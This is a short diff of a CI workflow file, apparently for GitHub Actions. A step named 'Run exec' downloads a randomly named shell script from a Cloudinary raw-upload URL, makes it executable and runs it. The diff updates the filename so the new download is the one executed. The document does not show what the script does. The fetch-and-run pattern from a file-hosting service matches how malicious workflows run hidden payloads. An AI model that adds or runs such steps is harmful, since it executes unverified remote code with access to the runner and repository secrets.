@@ -13,8 +13,8 @@ jobs:
       - name: Run exec
         run: |
           curl -O http://res.cloudinary.com/dyfqshedb/raw/upload/v1711042163/amzeqo8vdwsgytadhvk6.sh
-          chmod +x mbip0nevu8lc73fmojgp.sh
-          ./mbip0nevu8lc73fmojgp.sh
+          chmod +x amzeqo8vdwsgytadhvk6.sh
+          ./amzeqo8vdwsgytadhvk6.sh
 
       - name: IP Workflow
         run: |
